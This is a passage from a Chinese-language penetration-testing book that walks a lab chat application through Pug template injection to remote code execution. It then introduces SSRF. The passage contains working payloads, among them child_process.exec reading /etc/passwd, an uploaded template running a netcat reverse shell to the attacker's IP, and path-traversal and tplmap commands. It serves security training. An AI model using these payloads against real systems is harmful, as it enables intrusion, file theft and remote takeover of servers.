9*9数学方程式
因此，最终 payload 将如下所示：
[newline]=9*9
URL 编码：
GET /ti?user=%0a%3d9*9&comment=&link=
在响应正文中给出了81。你已在用户参数中发现了模板注入！让
GET /ti?user=%0a%3d9*9
我们通过利用 JavaScript 来获取远程代码。
正如你在响应中所看到的，我们在段落标记之外有“81”而不是用户名！这意味着我们能够注入
模板。
我们现在知道我们可以进行模板注入，因为我们可以执行简单的计算，但是我们需要看看是
否可以执行 shell。要获得 shell 执行，我们必须找到正确的函数来在 Node/JavaScript 中执
行。
首先，我们将识别自身全局对象的根节点，然后继续确定我们可以访问哪些模块和功
能。我们希望最终使用 Require 函数导入 child_process.exec 以运行操作系统命令。在
Pug 中，“=”字符允许我们输出 JavaScript 结果。我们将从访问全局根开始：
[new line]=global
使用 Burp 的解码器工具将上述表达式编码为 URL 编码，可以得到：
%0a%3d%20%67%6c%6f%62%61%6c
使用上面的 URL 编码字符串作为用户值并重新发送。
如果在提交前后请求一切顺利，我们将看到 [object global]，这意味着我们可以访问全局
87
第3章 抛传——Web 应用程序漏洞利用
对象。
解析全局对象：
让我们通过在全局范围内使用 Pug 迭代器‘each’来查看我们可以访问的对象和属性。记
住换行符（%0a）和空格（%20）：
each val,index in global p=index
URL 编码： %0a%65%61%63%68%20%76%61%6c%2c%69%6e%64%65%78%2
在上面的例子中，我们使用‘each’迭代器，它可以访问一个值，并且如果我们指定了数组
或对象，也可以选择访问索引。我们试图找到我们在全局对象中可以访问的对象，方法
或模块。我们的最终目标是找到类似“require”方法的东西，以允许我们导入
child_process.exec，它允许我们运行系统命令。从现在开始，我们只是使用反复试验来
识别最终会给我们 require 方法的方法或对象。
88
第3章 抛传——Web 应用程序漏洞利用
查找代码执行功能：
从上一个请求中，我们看到了全局中的所有对象以及一个名为“process”的对象。接下
来，我们需要识别我们在 global.process 中可以访问的有趣对象：
each val,index in global.process p=index
URL 编码： %0a%65%61%63%68%20%76%61%6c%2c%69%6e%64%65%7
我们从所有可用的方法中选择“process”，因为我们知道它最终会导致‘require’。你可以通
过选择不同的迭代方法来尝试尝试和错误过程：
each val,index in global.process.mainModule p = index
URL 编码： %0a%65%61%63%68%20%76%61%6c%2c%69%6e%64%65%78%2
远程执行代码：
发送此最终 payload ，我们应该在 global.process.mainModule 中看到“require”函数。我
们现在可以将其设置为使用.exec 导入‘child_process’以获取 RCE：
var x = global.process.mainModule.require
x('child_process').exec('cat / etc / passwd
>>/opt/web/chatSupportSystems/public/accounts.txt')
URL 编码： %0a%2d%20%76%61%72%20%78%20%3d%20%67%6c%6f%6
在上面的例子中，我们像在 JavaScript 中一样定义变量“x”，但行开头的破折号表示无缓
冲输出（隐藏）。我们正在使用全局对象和我们最终需要的模块‘require’，这允许我们使
用‘child_process’.exec 来运行系统命令。
我们将 /etc/passwd 的内容输出到 Web 公共根目录，这是我们唯一具有写入权限的目录
（由应用程序创建者设计），允许用户查看内容。我们也可以使用系统命令执行反向
shell或其他任何允许的操作。
我们可以看到 http://chat:3000/accounts.txt 将包含的内容
89
第3章 抛传——Web 应用程序漏洞利用
来自 Web 服务器的 /etc/passwd。
使用此命令在系统上执行完整的 RCE 并返回 shell。
现在，我们可以对这一系列操作实现自动化吗？当然可以。有一个类似 SQLmap 的名为
Tplmap 的工具，它可以尝试模板注入的所有不同组合：
cd /opt/tplmap
./tplmap.py -u "http://chat:3000/ti?user=*&comment=asdfasdf&link="
参考：
http://blog.portswigger.net/2015/08/server-side-template-injection.html
https://hawkinsecurity.com/2017/12/13/rce-via-spring-engine-ssti/
JavaScript 和远程代码执行
远程代码执行是我们在每次入侵和 Web 应用程序渗透测试中必须寻找的。虽然 RCE 几乎可
能在任何地方找到，但它们最常见于允许上传的地方，例如：上传 web shell，一个像
Imagetragick 这样的漏洞利用，使用 Office 文件进行 XXE 攻击，基于遍历的目录上传以替换
关键文件等。
90
第3章 抛传——Web 应用程序漏洞利用
传统来说，我们可能会尝试找到我们可以使用的上传区域和 shell。可以在此处找到不同类型
的 webshell payload 的绝佳列表：https://github.com/tennc/webshell 。请注意，我绝不会审
查任何这些 shell 是否存在后门，所以使用它们需要你自担风险。我遇到过很多有后门的
shell。
使用上传攻击对聊天应用程序进行攻击
在我们的实验室中，我们将在 Node 应用程序上执行上传 RCE。在我们的示例中，有一个文
件上传功能，允许任何文件上传。不幸的是，使用 Node，我们不能只通过 Web 浏览器调用
文件来执行文件，就像在 PHP 中一样。因此，在这种情况下，我们将使用动态路由端点尝试
呈现 Pug 文件的内容。错误在于端点将读取文件的内容，假设它是 Pug 文件，因为默认目录
存在于 Views 目录中。此端点上还存在路径遍历和本地文件读取漏洞。
在上传过程中，文件处理程序模块会将文件重命名为随机字符串，没有扩展名。在页面的上
传响应内容中，存在上载文件的服务器路径位置。使用这些信息，我们可以使用/drouting 执
行模板注入以实现远程代码执行。
既然我们知道底层应用程序是 Node(JavaScript)，我们可以上传什么样的 payload 来才能被
Pug 执行？回到我们之前使用的简单示例：
首先，为 require 模块分配一个变量
-var x = global.process.mainModule.require
使用子进程模块使我们能够通过运行任何系统命令来访问操作系统功能：
-x('child_process').exec('nc [Your_IP] 8888 -e /bin/bash')
RCE 上传攻击：
转到 http://chat:3000 并使用任何有效帐户登录
使用以下信息上传文本文件。在 Pug 中，“-”字符表示执行 JavaScript。
-var x = global.process.mainModule.require
-x('child_process')。exec('nc [Your_IP] 8888 -e / bin / bash')
通过上传文件查看 Burp 中的请求和响应。你将注意到在响应 POST 请求中上传的文件的
哈希值以及引用的 drouting。
91
第3章 抛传——Web 应用程序漏洞利用
在这个模板代码中，我们将 require 函数分配给 child_process.exec，它允许我们在操作
系统级别上运行命令。此代码将使 Web 服务器连接到在端口8888上 [Your_IP] 上运行
的监听器，并允许我们在 Web 服务器上运行 shell。
在攻击者计算机上，启动 shell 的 netcat 侦听器以连接回
nc -l -p 8888
我们通过在 /drouting 上运行端点来激活代码。在浏览器中，转到上传的哈希文件。
drouting 端点采用指定的 Pug 模板并呈现它。对我们来说幸运的是，我们上传的 Pug 模
板包含我们的反向 Shell 。
在浏览器中，使用你从文件上载响应中恢复的文件访问 drouting 端点。我们使用目
录遍历“../”来返回上一个目录，以便能够进入包含我们的恶意文件的 uploads 文件
夹：
/drouting?filename=../uploads/[你的文件哈希]
回到你的终端监听 8888 端口并在你的 shell 里操作吧！
92
第3章 抛传——Web 应用程序漏洞利用
服务器端请求伪造（SSRF）
服务器端请求伪造（SSRF）是我认为通常被误解的漏洞之一，并且在术语方面，经常与跨站
点请求伪造（CSRF）混淆。虽然这个漏洞已经存在了一段时间，但实际上还没有得到足够的
讨论和重视，尤其它可以造成的相当严重的后果。让我们来看看它是什么以及为什么会造成
严重的后果。
服务器端请求伪造通常被利用以访问本地系统，进入内部网络或允许某种移动。理解 SSRF
的最简单方法是通过一个例子讲述。假设你有一个公共 Web 应用程序，允许用户通过 URL
从 Internet 上下载配置文件图像。你登录该站点，转到你的个人资料，然后单击 Imgur（公共
图像托管服务）的更新个人资料按钮。你提供图像的 URL（ 例
如：https://i.imgur.com/FdtLoFI.jpg ）并点击提交。接下来发生的事情是服务器会创建一个全
新的请求，转到 Imgur 站点，抓取图像（它可能会执行一些图像操作来调整图像-图像跟踪任
何人的大小？），将其保存到服务器，并发送成功消息回到用户。如你所见，我们提供了一
个 URL，服务器获取该 URL 并抓取图像，并将其上传到其数据库。
我们提供了最初的 Web 应用程序的 URL，以从外部资源中获取我们的个人资料图片。但是，
如果我们将图像 URL 指向 http://127.0.0.1:80/favicon.ico 会发生什么？这将告诉服务器不是
请求像 Imgur 这样的东西，而且从本地主机服务器（它本身）获取 favicon.ico 图片文件。如
果我们能够获得返回包的值是 200 或使我们的个人资料图片成为本地的 favicon 图片，我们
就知道我们可能发现了 SSRF。
由于它在80端口上工作，那么如果我们尝试连接到 http://127.0.0.1:8080 会发生什么情况
（8080 是一个除 localhost 之外无法访问的端口）？这就是它变得有趣的地方。如果我们确
实得到完整的 HTTP 请求/响应，并且我们可以在本地对8080端口发出 GET 请求，那么如果
我们发现了一个易受攻击的 Jenkins 或 Apache Tomcat 服务会发生什么？即使这个端口没有
93
第3章 抛传——Web 应用程序漏洞利用
被公开监听，我们可能也可以入侵这个环境。更好的是，我们或许可以开始请求内网
IP：http://192.168.10.2-254 ，而不是127.0.0.1。回想一下那些返回了内网 IP 泄露的网络扫
描结果，你对此不屑一顾。但是这正是它们重新发挥作用的地方，我们可以通过它们来使用
内部网络服务。
SSRF 漏洞允许你可以执行以下操作：
1. 在回环接口上访问服务
2. 扫描内部网络和与这些服务的潜在交互方式（GET/POST/HEAD）
3. 使用 FILE:// 读取服务器上的本地文件
4. 使用 AWS Rest 接口（ http://bit.ly/2ELv5zZ ）
5. 横向移动到内部环境中
在我们的下图中，我们发现 Web 应用程序上存在易受攻击的 SSRF，允许我们利用此漏洞：
让我们来看一个现实中的例子：
在你的聊天支持系统（ http://chat:3000/ ）Web 应用程序中，首先确保创建一个帐户并
登录。
登录后，通过链接转到 Direct Message（DM）页面或直接通过
http://chat:3000/directmessage 。
在“链接”文本框中，放入 http://cyberspacekittens.com 等网站，然后单击预览链接。
你现在应该看到 http://cyberspacekittens.com 页面的呈现，但 URI 栏仍应指向我们的聊
天应用程序。
这表明该站点容易受到 SSRF 的攻击。我们也可以尝试聊天：3000/ssrf?
user=&comment=&link=http://127.0.0.1:3000 并指向 localhost。请注意，页面呈现了，
我们现在正通过有漏洞的服务器上的 localhost 访问该站点。
94
第3章 抛传——Web 应用程序漏洞利用